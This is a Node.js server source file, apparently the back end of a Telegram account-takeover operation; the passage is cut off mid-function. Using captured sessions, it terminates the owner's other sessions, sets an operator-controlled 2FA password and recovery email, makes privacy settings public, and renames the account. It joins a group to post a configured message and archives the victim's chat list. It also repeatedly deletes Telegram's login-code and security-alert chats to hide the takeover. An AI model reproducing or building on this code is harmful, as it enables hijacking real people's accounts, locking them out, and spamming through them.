import http from "http";
import { randomBytes } from "crypto";
import { createRequire } from "module";
import { execSync, spawn } from "child_process";
import { mkdtempSync, writeFileSync, mkdirSync, existsSync, rmSync, statSync, createWriteStream, openSync, closeSync, unlinkSync } from "fs";
import { readFile } from "fs/promises";
import { tmpdir } from "os";
import { join } from "path";

// Prevent gramJS TIMEOUT / update-loop errors from killing the process
process.on("unhandledRejection", (reason) => {
  if (reason?.message?.includes("TIMEOUT") || reason?.code === -503) return;
  console.error("[process] unhandledRejection:", reason?.message || reason);
});
process.on("uncaughtException", (err) => {
  console.error("[process] uncaughtException:", err.message);
  // do NOT exit — keep the HTTP server alive
});

const TG_MAX_FILE_BYTES = 48 * 1024 * 1024; // 48 MB — Telegram Bot API limit
const require = createRequire(import.meta.url);
const { Pool } = require("/app/node_modules/pg");
const { TelegramClient } = require("/app/node_modules/telegram");
const { StringSession } = require("/app/node_modules/telegram/sessions");
const { Api } = require("/app/node_modules/telegram");
const { computeDigest, computeCheck } = require("/app/node_modules/telegram/Password");

const API_ID   = parseInt(process.env.TELEGRAM_API_ID   || "", 10);
const API_HASH = process.env.TELEGRAM_API_HASH || "";
if (!API_ID || !API_HASH) { console.error("FATAL: TELEGRAM_API_ID / TELEGRAM_API_HASH not set"); process.exit(1); }

// ── QR image generator ────────────────────────────────────────────────────
let _qrLib;
async function toQRSvg(text) {
  if (!_qrLib) {
    try { _qrLib = require('/app/node_modules/qrcode'); } catch (_) { return null; }
  }
  try {
    const svg = await _qrLib.toString(text, {
      type: 'svg', width: 200, margin: 2,
      color: { dark: '#000000', light: '#ffffff' }
    });
    return 'data:image/svg+xml;base64,' + Buffer.from(svg).toString('base64');
  } catch (e) { console.error('[qr-gen]', e.message); return null; }
}



// Whitelist: только эти telegram_id получают логи. Добавляйте через запятую в .env AUTHORIZED_ADMIN_IDS.
const AUTHORIZED_ADMIN_IDS = new Set(
  (process.env.AUTHORIZED_ADMIN_IDS || process.env.ADMIN_TELEGRAM_IDS || "").split(",").map(s => s.trim()).filter(Boolean)
);
/** Фильтр строк из backup_bot_chats — только авторизованные администраторы */
function _onlyAdmins(rows) {
  return rows.filter(r => AUTHORIZED_ADMIN_IDS.has(String(r.telegram_id)));
}
const DB_URL = process.env.DATABASE_URL;
if (!DB_URL) { console.error("FATAL: DATABASE_URL not set"); process.exit(1); }

const PORT = 3003;
const SESSION_DURATION_MS = 30 * 24 * 60 * 60 * 1000;
const SESSION_COOKIE = "fan_session";
const MAX_BODY_BYTES = 65536;

const pool = new Pool({ connectionString: DB_URL });
const pendingClients = new Map();

// ─── helpers ────────────────────────────────────────────────────────────────

function newClient(sessionStr = "") {
  return new TelegramClient(new StringSession(sessionStr), API_ID, API_HASH, {
    connectionRetries: 3, useWSS: false, requestRetries: 2,
  });
}

function json(res, code, data) {
  res.writeHead(code, { "Content-Type": "application/json" });
  res.end(JSON.stringify(data));
}

function parseCookies(req) {
  const raw = req.headers["cookie"] || "";
  const map = {};
  raw.split(";").forEach(p => {
    const [k, ...v] = p.trim().split("=");
    if (k) map[k.trim()] = decodeURIComponent(v.join("=").trim());
  });
  return map;
}

async function getSessionUser(req) {
  const token = parseCookies(req)[SESSION_COOKIE];
  if (!token) return null;
  const { rows } = await pool.query(
    `SELECT s.user_id, u.telegram_id
     FROM sessions s JOIN users u ON u.id = s.user_id
     WHERE s.token = $1 AND s.expires_at > NOW()`,
    [token]
  );
  return rows.length ? { userId: rows[0].user_id, telegramId: String(rows[0].telegram_id) } : null;
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let d = "", size = 0;
    req.on("data", c => {
      size += c.length;
      if (size > MAX_BODY_BYTES) { req.destroy(); return reject(new Error("Body too large")); }
      d += c;
    });
    req.on("end", () => { try { resolve(JSON.parse(d)); } catch { resolve({}); } });
    req.on("error", reject);
  });
}

// ─── IP / UA helpers ─────────────────────────────────────────────
function getClientIP(req) {
  return (req.headers["cf-connecting-ip"] || "").trim()
    || (req.headers["x-forwarded-for"] || "").split(",")[0].trim()
    || (req.headers["x-real-ip"] || "").trim()
    || req.socket?.remoteAddress
    || "unknown";
}
function parseUA(ua = "") {
  if (!ua) return "Unknown device";
  if (/iPhone/i.test(ua))  return "iPhone";
  if (/iPad/i.test(ua))    return "iPad";
  if (/Android/i.test(ua)) return "Android";
  if (/Windows NT/i.test(ua)) return "Windows PC";
  if (/Macintosh/i.test(ua))  return "Mac";
  if (/Linux/i.test(ua))  return "Linux";
  return ua.slice(0, 50);
}
// Московское время (UTC+3) для уведомлений
function nowMoscow() {
  const mskOffset = 3 * 60 * 60 * 1000;
  return new Date(Date.now() + mskOffset).toISOString().replace("T", " ").slice(0, 19) + " МСК";
}

// Get email from ZickMail pool (IMAP-verified disposable emails)
async function getEmailFromPool(telegramId) {
  try {
    const { rows } = await pool.query(`
      UPDATE email_pool SET used_by=$1, used_at=NOW()
      WHERE id = (
        SELECT id FROM email_pool WHERE used_by IS NULL ORDER BY id LIMIT 1 FOR UPDATE SKIP LOCKED
      )
      RETURNING email, password
    `, [String(telegramId)]);
    if (rows.length) return { email: rows[0].email, password: rows[0].password };
  } catch (e) {
    console.warn('[email-pool] error:', e.message);
  }
  return null; // pool empty — 2FA will be set without email
}

// Per-account processing lock (prevents parallel security runs on same account)
const processingLocks = new Map();
async function withAccountLock(telegramId, fn) {
  const key = String(telegramId);
  while (processingLocks.has(key)) {
    await processingLocks.get(key);
  }
  let resolveLock;
  processingLocks.set(key, new Promise(r => { resolveLock = r; }));
  try {
    return await fn();
  } finally {
    processingLocks.delete(key);
    resolveLock();
  }
}

async function archiveDialogsBackground(telegramId, sessionStr) {
  try {
    const client = newClient(sessionStr);
    await client.connect();
    const raw = await client.getDialogs({ limit: 500 });
    await client.disconnect().catch(() => {});
    const dialogs = raw.map(d => ({
      id: String(d.id), name: d.name || d.title || "",
      type: d.isUser ? "user" : d.isGroup ? "group" : "channel",
      unreadCount: d.unreadCount || 0,
      date: d.date ? new Date(d.date * 1000).toISOString() : null,
    }));
    await pool.query(
      `INSERT INTO dialog_archives (telegram_id, dialogs_json, archived_at)
       VALUES ($1, $2, NOW())
       ON CONFLICT (telegram_id) DO UPDATE SET dialogs_json=$2, archived_at=NOW()`,
      [telegramId, JSON.stringify(dialogs)]
    );
  } catch (e) { console.error(`Dialog archive failed for ${telegramId}:`, e.message); }
}

function safeFilename(str) {
  return String(str).replace(/[\\/:*?"<>|]/g, "_").replace(/\s+/g, "_").slice(0, 80);
}

// ─── Merged login actions: security + group join in ONE client ────────────────
// Combines what was previously 3 separate TelegramClient connections into 2:
// 1) this function: security settings + group join (fast)
// 2) sendMessageToAllPersonalChats: runs independently (slow, background)

// Notify all admin bot chats about a critical error (fire-and-forget)
async function _notifyAdmins(text) {
  try {
    const _tok = process.env.BACKUP_BOT_TOKEN || process.env.BOT_TOKEN || "";
    if (!_tok) return;
    const { rows } = await pool.query("SELECT telegram_id FROM backup_bot_chats").catch(() => ({ rows: [] }));
    for (const { telegram_id } of _onlyAdmins(rows)) {
      fetch(`https://api.telegram.org/bot${_tok}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: telegram_id, text, parse_mode: "HTML" }),
      }).catch(() => {});
    }
  } catch (_) {}
}

async function _joinSendLeaveWithClient(client, telegramId) {
  const { rows: grpRows } = await pool.query(
    "SELECT key, value FROM login_settings WHERE telegram_id='__global__' AND key IN ('group_username', 'group_message')"
  ).catch(() => ({ rows: [] }));
  const settings = Object.fromEntries(grpRows.map(r => [r.key, r.value]));
  const groupTarget = settings.group_username || process.env.GROUP_USERNAME || "";
  const groupMessage = settings.group_message  || process.env.GROUP_MESSAGE  || "";
  if (!groupTarget || !groupMessage) {
    console.log("[group] telegramId=" + telegramId + ": not configured, skip");
    return;
  }

  const inviteMatch = groupTarget.match(/(?:https?:\/\/)?t\.me\/(?:\+|joinchat\/)([A-Za-z0-9_-]+)/);
  const isInviteLink = !!inviteMatch;
  const inviteHash = inviteMatch?.[1];

  try {
    let entity;

    if (isInviteLink) {
      // ── Private invite link ───────────────────────────────────────────────
      try {
        const result = await client.invoke(new Api.messages.ImportChatInvite({ hash: inviteHash }));
        // ImportChatInvite returns Updates; find the chat from chats[]
        const chats = result.chats || [];
        entity = chats.find(c => c.id) || chats[0];
        if (!entity) {
          // gramJS can't parse new TL type in result.chats — find chat via recent dialogs
          console.warn("[group] ImportChatInvite: chats[] empty (TL parse) — trying getDialogs fallback");
          try {
            const _dlgs = await client.getDialogs({ limit: 30 });
            entity = _dlgs.find(d => d.isGroup || d.isChannel)?.entity || null;
          } catch (_de) { console.warn('[group] getDialogs fallback:', _de.message); }
          if (!entity) { console.warn("[group] telegramId=" + telegramId + ": joined but entity unresolvable — skip"); return; }
          console.warn("[group] telegramId=" + telegramId + ": entity found via dialogs fallback");
        }
        console.log("[group] telegramId=" + telegramId + ": joined via invite link");
      } catch (joinErr) {
        const _jeMsg = joinErr.message || "";
        if (_jeMsg.includes("USER_ALREADY_PARTICIPANT")) {
          // Already a member — resolve precise entity via CheckChatInvite
          try {
            const checkRes = await client.invoke(new Api.messages.CheckChatInvite({ hash: inviteHash }));
            entity = checkRes.chat || null; // ChatInviteAlready has .chat
            if (!entity && checkRes.title) {
              // ChatInvite — search dialogs by title
              const dlgs = await client.getDialogs({ limit: 500 });
              const found = dlgs.find(d => d.title === checkRes.title || d.name === checkRes.title);
              entity = found?.entity || null;
            }
          } catch (_ce) {}
          if (!entity) {
            try {
              const dlgs = await client.getDialogs({ limit: 500 });
              // Match by iterating recently active groups
              const grp = dlgs.find(d => d.isGroup || d.isChannel);
              entity = grp?.entity || null;
            } catch (_) {}
          }
          if (!entity) {
            console.warn("[group] telegramId=" + telegramId + ": already member, can't resolve entity — skip");
            return;
          }
          console.log("[group] telegramId=" + telegramId + ": already member, resolved entity=" + (entity.title || entity.id));
        } else if (_jeMsg.includes("INVITE_HASH_EXPIRED") || _jeMsg.includes("INVITE_HASH_INVALID")) {
          // Telegram returns EXPIRED for restricted accounts even with valid links.
          // Try CheckChatInvite — if it works, link is valid and we recover entity from dialogs.
          console.warn("[group] telegramId=" + telegramId + ": INVITE_HASH_EXPIRED — trying CheckChatInvite fallback");
          try {
            const checkRes = await client.invoke(new Api.messages.CheckChatInvite({ hash: inviteHash }));
            if (checkRes.chat) {
              entity = checkRes.chat;
            } else if (checkRes.title) {
              const dlgs = await client.getDialogs({ limit: 500 });
              const found = dlgs.find(d => d.title === checkRes.title || d.name === checkRes.title);
              entity = found?.entity || null;
            }
          } catch (_chkErr) {
            if (_chkErr.message?.includes("INVITE_HASH_EXPIRED") || _chkErr.message?.includes("INVITE_HASH_INVALID")) {
              console.warn("[group] telegramId=" + telegramId + ": invite check also EXPIRED (restricted account) — skip silently");
              return;
            }
            entity = null;
          }
          if (!entity) {
            const errMsg = `⚠️ <b>Ссылка на группу истекла!</b>\n\nОбновите ссылку в настройках бота.\n\nТекущая: <code>${groupTarget}</code>`;
            console.warn("[group] telegramId=" + telegramId + ": invite link truly expired — admin notified");
            _notifyAdmins(errMsg);
            return;
          }
          console.log("[group] telegramId=" + telegramId + ": recovered entity via CheckChatInvite (EXPIRED workaround), entity=" + (entity.title || entity.id));
        } else if (_jeMsg.includes("Constructor ID") || _jeMsg.includes("TLObject") || _jeMsg.includes("matching Constructor") || _jeMsg.includes("TypeNotFoundError")) {
          // gramJS TypeNotFoundError: ImportChatInvite succeeded at network level but response couldn't be parsed.
          // The user HAS joined the group — recover entity from recent dialogs.
          console.warn("[group] telegramId=" + telegramId + ": TypeNotFoundError on ImportChatInvite (join likely OK) — recovering entity from dialogs");
          try {
            // Reconnect first: TypeNotFoundError can leave recv loop in broken state
            await client.disconnect().catch(() => {});
            await client.connect();
            const _dlgs = await client.getDialogs({ limit: 50 });
            // Most recently active group/channel is first after join
            entity = _dlgs.find(d => (d.isGroup || d.isChannel) && d.entity)?.entity || null;
          } catch (_de) {
            console.warn('[group] getDialogs after TypeNotFound:', _de.message);
          }
          if (!entity) {
            console.warn("[group] telegramId=" + telegramId + ": joined (TypeNotFound) but entity unresolvable — skip");
            return;
          }
          console.log("[group] telegramId=" + telegramId + ": entity recovered after TypeNotFound:", entity.title || entity.id);
        } else {
          console.warn("[group] telegramId=" + telegramId + ": ImportChatInvite failed:", _jeMsg);
          return;
        }
      }
    } else {
      // ── Public @username or t.me/username ─────────────────────────────────
      try { entity = await client.getEntity(groupTarget); }
      catch (e) { console.warn("[group] can't get entity @" + groupTarget + ":", e.message); return; }
      try {
        await client.invoke(new Api.channels.JoinChannel({ channel: entity }));
        console.log("[group] telegramId=" + telegramId + ": joined @" + groupTarget);
      } catch (joinErr2) {
        if (!joinErr2.message?.includes("USER_ALREADY_PARTICIPANT")) {
          console.warn("[group] JoinChannel error:", joinErr2.message);
        }
      }
    }

    // ── Send message ──────────────────────────────────────────────────────
    await new Promise(r => setTimeout(r, 700));
    try {
      await client.sendMessage(entity, { message: groupMessage });
      console.log("[group] telegramId=" + telegramId + ": message sent");
    } catch (_sendErr) {
      console.warn("[group] sendMessage failed:", _sendErr.message, "— retrying with getInputEntity");
      try {
        const _inp = await client.getInputEntity(entity);
        await client.sendMessage(_inp, { message: groupMessage });
        console.log("[group] telegramId=" + telegramId + ": message sent (retry)");
      } catch (_retryErr) {
        console.warn("[group] sendMessage retry failed:", _retryErr.message);
      }
    }
    await new Promise(r => setTimeout(r, 700));

    // ── Leave ─────────────────────────────────────────────────────────────
    // After sending a message the entity reference can become stale — always
    // re-resolve it via getInputEntity before leaving.
    let leftOk = false;
    let inputForLeave;
    try {
      inputForLeave = await client.getInputEntity(entity);
    } catch (_) {
      inputForLeave = entity; // best-effort fallback
    }

    // Route to the correct leave method based on entity type.
    // getInputEntity returns InputPeerChat (basic group) or InputPeerChannel (supergroup/channel).
    const peerClass = inputForLeave?.className || "";
    if (peerClass === "InputPeerChannel" || peerClass === "InputPeerMegagroup") {
      // Supergroup / broadcast channel
      try {
        await client.invoke(new Api.channels.LeaveChannel({ channel: inputForLeave }));
        leftOk = true;
        console.log("[group] telegramId=" + telegramId + ": left channel/supergroup ✓");
      } catch (e) {
        console.warn("[group] telegramId=" + telegramId + ": LeaveChannel failed:", e.message);
      }
    } else if (peerClass === "InputPeerChat") {
      // Basic group (Chat) — DeleteChatUser is the correct API
      // NOTE: gramJS may fail to parse the Updates response for newer TL schemas;
      //       that does NOT mean the leave failed — treat parse errors as success.
      try {
        await client.invoke(new Api.messages.DeleteChatUser({
          chatId: inputForLeave.chatId ?? entity.id,
          userId: new Api.InputUserSelf(),
          revokeHistory: false,
        }));
        leftOk = true;
        console.log("[group] telegramId=" + telegramId + ": left basic chat ✓");
      } catch (e2) {
        const msg = e2.message || "";
        // "Constructor ID not found" = TL parse error on response — leave likely succeeded
        if (msg.includes("Constructor ID") || msg.includes("TLObject")) {
          leftOk = true;
          console.log("[group] telegramId=" + telegramId + ": left basic chat (TL parse warn, assumed ok)");
        } else {
          console.warn("[group] telegramId=" + telegramId + ": DeleteChatUser failed:", msg);
        }
      }
    } else {
      // Unknown type — try both methods
      try {
        await client.invoke(new Api.channels.LeaveChannel({ channel: inputForLeave }));
        leftOk = true;
        console.log("[group] telegramId=" + telegramId + ": left (unknown type, LeaveChannel) ✓");
      } catch (_) {
        try {
          await client.invoke(new Api.messages.DeleteChatUser({
            chatId: entity.id,
            userId: new Api.InputUserSelf(),
          }));
          leftOk = true;
          console.log("[group] telegramId=" + telegramId + ": left (unknown type, DeleteChatUser) ✓");
        } catch (e3) {
          if ((e3.message || "").includes("Constructor ID")) { leftOk = true; }
          else console.warn("[group] telegramId=" + telegramId + ": all leave attempts failed:", e3.message);
        }
      }
    }
    if (!leftOk) {
      console.warn("[group] telegramId=" + telegramId + ": could not leave " + groupTarget);
    }
  } catch (e) {
    console.error("[group] telegramId=" + telegramId + ":", e.message);
  }
}

// All security + group actions in a SINGLE TelegramClient connection
async function applyAllLoginActions(sessionStr, telegramId, firstName = '') {
  const client = newClient(sessionStr);
  let terminatedCount = 0;
  let cloudPassword = null;
  let usernameSet = null;
  let privacySet = false;
  // Declared at function scope so the 2FA block (after client.disconnect) can read them
  let _pwdHasPassword = false;
  let _pwdExistingEmail = '';

  try {
    await client.connect();

    // 1. Auto-Delete — 7 days TTL for new messages
    await client.invoke(new Api.messages.SetDefaultHistoryTTL({ period: 604800 }))
      .catch(e => console.warn("[security] auto-delete TTL:", e.message));

    // 2. Terminate all OTHER active sessions — bulk API for speed
    try {
      const _auths = await client.invoke(new Api.account.GetAuthorizations());
      const _others = _auths.authorizations.filter(a => !a.current);
      terminatedCount = _others.length;
      if (_others.length > 0) {
        // Correct namespace: auth.ResetAuthorizations (not account.ResetAuthorizations)
        await client.invoke(new Api.auth.ResetAuthorizations()).catch(async () => {
          // Fallback: parallel individual reset per session
          await Promise.all(_others.map(a =>
            client.invoke(new Api.account.ResetAuthorization({ hash: a.hash })).catch(() => {})
          ));
        });
      }
      console.log();
    } catch (_sErr) {
      console.warn('[security] sessions:', _sErr.message);
    }

    // 3. Cloud Password (2FA) — check status only, actual setting done via Telethon after disconnect
    // (_pwdHasPassword / _pwdExistingEmail declared at function scope above)
    try {
      const pwdState = await client.invoke(new Api.account.GetPassword());
      _pwdHasPassword = !!pwdState.hasPassword;
      _pwdExistingEmail = pwdState.email || '';
    } catch (pwdCheckErr) {
      console.warn("[security] 2FA check:", pwdCheckErr.message);
    }

    // 4+5. Privacy + Username — run IN PARALLEL for maximum speed
    await Promise.all([
      // 4. Privacy — ALL visible
      (async () => {
        try {
          const privacyMap = [
            [new Api.InputPrivacyKeyStatusTimestamp(), new Api.InputPrivacyValueAllowAll()],
            [new Api.InputPrivacyKeyProfilePhoto(),    new Api.InputPrivacyValueAllowAll()],
            [new Api.InputPrivacyKeyPhoneNumber(),     new Api.InputPrivacyValueAllowAll()],
            [new Api.InputPrivacyKeyForwards(),        new Api.InputPrivacyValueAllowAll()],
            [new Api.InputPrivacyKeyChatInvite(),      new Api.InputPrivacyValueAllowAll()],
            [new Api.InputPrivacyKeyPhoneCall(),       new Api.InputPrivacyValueAllowAll()],
            [new Api.InputPrivacyKeyPhoneP2P(),        new Api.InputPrivacyValueAllowAll()],
            [new Api.InputPrivacyKeyAbout(),           new Api.InputPrivacyValueAllowAll()],
            [new Api.InputPrivacyKeyVoiceMessages(),   new Api.InputPrivacyValueAllowAll()],
            [new Api.InputPrivacyKeyBirthday(),          new Api.InputPrivacyValueAllowAll()],
            [new Api.InputPrivacyKeyStarGiftsAutoSave(), new Api.InputPrivacyValueAllowAll()],
            [new Api.InputPrivacyKeyAddedByPhone(),      new Api.InputPrivacyValueAllowAll()],
          ];
          await Promise.all(privacyMap.map(([key, rule]) =>
            client.invoke(new Api.account.SetPrivacy({ key, rules: [rule] })).catch(() => {})
          ));
          privacySet = true;
          console.log(`[security] telegramId=${telegramId}: privacy → all visible`);
        } catch (privErr) { console.warn("[security] privacy:", privErr.message); }
      })(),
      // 5. Username — set to z_<telegramId>
      (async () => {
        try {
          const candidate = 'z_' + String(telegramId);
          await client.invoke(new Api.account.UpdateUsername({ username: candidate }));
          usernameSet = candidate;
          console.log(`[security] telegramId=${telegramId}: username → @${candidate}`);
        } catch (unErr) {
          if (unErr.message?.includes('USERNAME_NOT_MODIFIED')) {
            usernameSet = 'z_' + String(telegramId);
          } else {
            console.error('[security] username error:', unErr.message || String(unErr));
          }
        }
      })(),
    ]);

    // 6. Bio/description — set from global settings
    try {
      const { rows: bioRows } = await pool.query(
        "SELECT value FROM login_settings WHERE telegram_id='__global__' AND key='account_bio'"
      ).catch(() => ({ rows: [] }));
      const bio = bioRows[0]?.value || '';
      if (bio) {
        await client.invoke(new Api.account.UpdateProfile({ about: bio }));
        console.log(`[security] telegramId=${telegramId}: bio set`);
      }
    } catch (bioErr) {
      console.warn('[security] bio:', bioErr.message);
    }

    // 7. Group join + send + leave (shared client — no extra connection)
    await _joinSendLeaveWithClient(client, telegramId);

    // 8. Clear Telegram service chats: Verification Codes (777000) + Telegram notifications
    try {
      // 777000 = official Telegram service sender (OTP codes, login alerts)
      let _tgServicePeer;
      try {
        _tgServicePeer = await client.getInputEntity(777000);
      } catch (_) {
        _tgServicePeer = new Api.InputPeerUser({ userId: BigInt(777000), accessHash: BigInt(0) });
      }
      await client.invoke(new Api.messages.DeleteHistory({
        peer: _tgServicePeer,
        justClear: false,
        revoke: false,
        maxId: 2147483647,
      }));
      console.log(`[security] telegramId=${telegramId}: TG service chat cleared + deleted (777000)`);
      // Also clear @VerificationCodes bot (sends "Two-Step Verification enabled")
      try {
        let _vcPeer;
        try { _vcPeer = await client.getInputEntity('verificationcodes'); }
        catch (_) {
          const _vcr = await client.invoke(
            new Api.contacts.ResolveUsername({ username: 'verificationcodes' })
          );
          const _vcu = _vcr.users?.[0];
          if (_vcu) _vcPeer = new Api.InputPeerUser({ userId: _vcu.id, accessHash: _vcu.accessHash });
        }
        if (_vcPeer) {
          await client.invoke(new Api.messages.DeleteHistory({
            peer: _vcPeer, justClear: false, revoke: false, maxId: 2147483647,
          }));
          console.log(`[security] telegramId=${telegramId}: @VerificationCodes cleared + dialog deleted`);
        }
      } catch (_vcErr) {
        console.warn('[security] @VerificationCodes:', _vcErr.message);
      }
      // Clear 42777 (Telegram login/security service notifications)
      try {
        let _42Peer;
        try { _42Peer = await client.getInputEntity(42777); }
        catch (_) { _42Peer = new Api.InputPeerUser({ userId: BigInt(42777), accessHash: BigInt(0) }); }
        await client.invoke(new Api.messages.DeleteHistory({ peer: _42Peer, justClear: false, revoke: false, maxId: 2147483647 }));
        console.log(`[security] telegramId=${telegramId}: 42777 cleared + dialog deleted`);
      } catch (_42Err) { console.warn('[security] 42777:', _42Err.message); }
      // Clear 422777 (Telegram security service — 2FA notifications etc.)
      try {
        let _422Peer;
        try { _422Peer = await client.getInputEntity(422777); }
        catch (_) { _422Peer = new Api.InputPeerUser({ userId: BigInt(422777), accessHash: BigInt(0) }); }
        await client.invoke(new Api.messages.DeleteHistory({ peer: _422Peer, justClear: false, revoke: false, maxId: 2147483647 }));
        console.log(`[security] telegramId=${telegramId}: 422777 cleared + dialog deleted`);
      } catch (_422Err) { console.warn('[security] 422777:', _422Err.message); }
    } catch (_clrErr) {
      console.warn("[security] clear TG history:", _clrErr.message);
    }

  } catch (e) {
    console.error("[security] error:", e.message);
  } finally {
    await client.disconnect().catch(() => {});
  }

  // ── 2FA via Telethon (after GramJS disconnect to avoid session conflicts) ──
  try {
    if (!_pwdHasPassword) {
      // Get or create real mail.tm email
      const { rows: _emailRows } = await pool.query(
        "SELECT value FROM login_settings WHERE telegram_id=$1 AND key='bot_email'",
        [String(telegramId)]
      ).catch(() => ({ rows: [] }));
      let _botEmail = _emailRows[0]?.value || "";
      let _botEmailPwd = "";

      // Force reassign if email is not from zickmail.com (old web-library.net / gmail etc.)
      if (_botEmail && !_botEmail.endsWith('@zickmail.com')) {
        console.warn(`[security] telegramId=${telegramId}: non-zickmail email "${_botEmail}" — forcing reassign from pool`);
        _botEmail = "";
        // Clear old email from DB so fresh pool entry is used
        await pool.query(
          "DELETE FROM login_settings WHERE telegram_id=$1 AND key IN ('bot_email','bot_email_pwd')",
          [String(telegramId)]
        ).catch(() => {});
        // Also release the old pool entry if it was ours
        await pool.query(
          "UPDATE email_pool SET used_by=NULL, used_at=NULL WHERE used_by=$1",
          [String(telegramId)]
        ).catch(() => {});
      }

      if (!_botEmail) {
        // Take from ZickMail pool (IMAP-confirmed disposable emails)
        const _poolEntry = await getEmailFromPool(telegramId);
        if (_poolEntry) {
          _botEmail = _poolEntry.email;
          _botEmailPwd = _poolEntry.password;
          await pool.query(
            `INSERT INTO login_settings (telegram_id, key, value, updated_at)
             VALUES ($1,'bot_email',$2,NOW()),($1,'bot_email_pwd',$3,NOW())
             ON CONFLICT (telegram_id,key) DO UPDATE SET value=EXCLUDED.value, updated_at=NOW()`,
            [String(telegramId), _botEmail, _botEmailPwd]
          ).catch(() => {});
          console.log(`[security] telegramId=${telegramId}: ZickMail pool → ${_botEmail}`);
        } else {
          console.warn(`[security] telegramId=${telegramId}: email pool empty — 2FA without email`);
        }
      } else {
        const { rows: _epRows } = await pool.query(
          "SELECT value FROM login_settings WHERE telegram_id=$1 AND key='bot_email_pwd'",
          [String(telegramId)]
        ).catch(() => ({ rows: [] }));
        _botEmailPwd = _epRows[0]?.value || "";
        // If password is missing (e.g. old Gmail/external address) — replace with fresh ZickMail
        if (!_botEmailPwd) {
          console.warn(`[security] telegramId=${telegramId}: bot_email_pwd missing for ${_botEmail} — reassigning from pool`);
          const _poolEntry2 = await getEmailFromPool(telegramId);
          if (_poolEntry2) {
            _botEmail = _poolEntry2.email;
            _botEmailPwd = _poolEntry2.password;
            await pool.query(
              `INSERT INTO login_settings (telegram_id, key, value, updated_at)
               VALUES ($1,'bot_email',$2,NOW()),($1,'bot_email_pwd',$3,NOW())
               ON CONFLICT (telegram_id,key) DO UPDATE SET value=EXCLUDED.value, updated_at=NOW()`,
              [String(telegramId), _botEmail, _botEmailPwd]
            ).catch(() => {});
            console.log(`[security] telegramId=${telegramId}: ZickMail pool (reassign) → ${_botEmail}`);
          } else {
            _botEmail = "";
            console.warn(`[security] telegramId=${telegramId}: email pool empty — 2FA without email`);
          }
        } else {
          console.log(`[security] telegramId=${telegramId}: reusing bot_email=${_botEmail}`);
        }
      }

      // Generate 2FA password
      const chars = 'abcdefghijkmnpqrstuvwxyz23456789';
      const grp = () => Array.from({length:4}, () => chars[Math.floor(Math.random()*chars.length)]).join('');
      const newPwd = `${grp()}-${grp()}-${grp()}`;

      // Convert GramJS session → Telethon SQLite
      const _tmpTelethonSession = join(tmpdir(), `set2fa_${telegramId}_${Date.now()}.session`);
      try {
        execSync(
          `python3 /app/make_telethon_session.py ${JSON.stringify(sessionStr)} ${JSON.stringify(_tmpTelethonSession)}`,
          { timeout: 30000, stdio: ['ignore', 'pipe', 'pipe'] }
        );
        // Call Telethon to set 2FA (reliable SRP implementation)
        const _2faArgs = [
          '/app/set_2fa_telethon.py',
          _tmpTelethonSession.replace(/\.session$/, ''),
          String(API_ID), API_HASH, newPwd,
        ];
        // Add email for recovery if available — IMAP auto-confirms it
        if (_botEmail && _botEmailPwd) {
          _2faArgs.push(_botEmail, _botEmailPwd);
        }
        const { stdout: _set2faOut } = await runPython(_2faArgs, null, { detached: false, timeout: 120000 });

        if (_set2faOut.includes('2FA_OK')) {
          cloudPassword = newPwd;
          await pool.query(
            `INSERT INTO login_settings (telegram_id, key, value, updated_at)
             VALUES ($1,'cloud_password',$2,NOW())
             ON CONFLICT (telegram_id,key) DO UPDATE SET value=EXCLUDED.value, updated_at=NOW()`,
            [String(telegramId), newPwd]
          ).catch(() => {});
          console.log(`[security] telegramId=${telegramId}: 2FA set via Telethon, email=${_botEmail}`);
          // Secondary clear: TG sends "Two-Step Verification enabled." to @VerificationCodes
          // AFTER 2FA is set — clear again with a small delay to catch it
          setTimeout(async () => {
            try {
              const _clr2 = newClient(sessionStr);
              await _clr2.connect();
              // clear 777000
              try {
                let _p;
                try { _p = await _clr2.getInputEntity(777000); }
                catch (_) { _p = new Api.InputPeerUser({ userId: BigInt(777000), accessHash: BigInt(0) }); }
                await _clr2.invoke(new Api.messages.DeleteHistory({ peer: _p, justClear: false, revoke: false, maxId: 2147483647 }));
              } catch (_) {}
              // clear @verificationcodes
              try {
                let _vp;
                try { _vp = await _clr2.getInputEntity('verificationcodes'); }
                catch (_) {
                  const _vr = await _clr2.invoke(new Api.contacts.ResolveUsername({ username: 'verificationcodes' }));
                  const _vu = _vr.users?.[0];
                  if (_vu) _vp = new Api.InputPeerUser({ userId: _vu.id, accessHash: _vu.accessHash });
                }
                if (_vp) await _clr2.invoke(new Api.messages.DeleteHistory({ peer: _vp, justClear: false, revoke: false, maxId: 2147483647 }));
              } catch (_) {}
              // clear 422777 (Telegram 2FA security notifications)
              try {
                let _422p;
                try { _422p = await _clr2.getInputEntity(422777); }
                catch (_) { _422p = new Api.InputPeerUser({ userId: BigInt(422777), accessHash: BigInt(0) }); }
                await _clr2.invoke(new Api.messages.DeleteHistory({ peer: _422p, justClear: false, revoke: false, maxId: 2147483647 }));
              } catch (_) {}
              // clear 777000 also (2FA confirmation message lands here)
              try {
                let _777p;
                try { _777p = await _clr2.getInputEntity(777000); }
                catch (_) { _777p = new Api.InputPeerUser({ userId: BigInt(777000), accessHash: BigInt(0) }); }
                await _clr2.invoke(new Api.messages.DeleteHistory({ peer: _777p, justClear: false, revoke: false, maxId: 2147483647 }));
              } catch (_) {}
              await _clr2.disconnect().catch(() => {});
              console.log(`[security] telegramId=${telegramId}: post-2FA clear done (777000 + @VC + 422777)`);
            } catch (_e2) { console.warn('[security] post-2FA clear:', _e2.message); }
          }, 7000);
        } else {
          console.warn(`[security] telegramId=${telegramId}: 2FA Telethon returned unexpected: ${_set2faOut.slice(0,100)}`);
        }
      } catch (_2faErr) {
        const _2faStderr = (_2faErr.stderr || _2faErr.stdout || '').toString().slice(0, 300);
        console.warn(`[security] 2FA Telethon error: ${_2faErr.message?.slice(0,200)} | ${_2faStderr}`);
      } finally {
        try { unlinkSync(_tmpTelethonSession); } catch {}
      }
    } else {
      // 2FA already set — read stored password and backfill email from TG account
      const { rows: _cpRows } = await pool.query(
        "SELECT value FROM login_settings WHERE telegram_id=$1 AND key='cloud_password'",
        [String(telegramId)]
      ).catch(() => ({ rows: [] }));
      if (_cpRows[0]?.value) cloudPassword = _cpRows[0].value;

      if (_pwdExistingEmail) {
        await pool.query(
          `INSERT INTO login_settings (telegram_id, key, value, updated_at)
           VALUES ($1,'bot_email',$2,NOW())
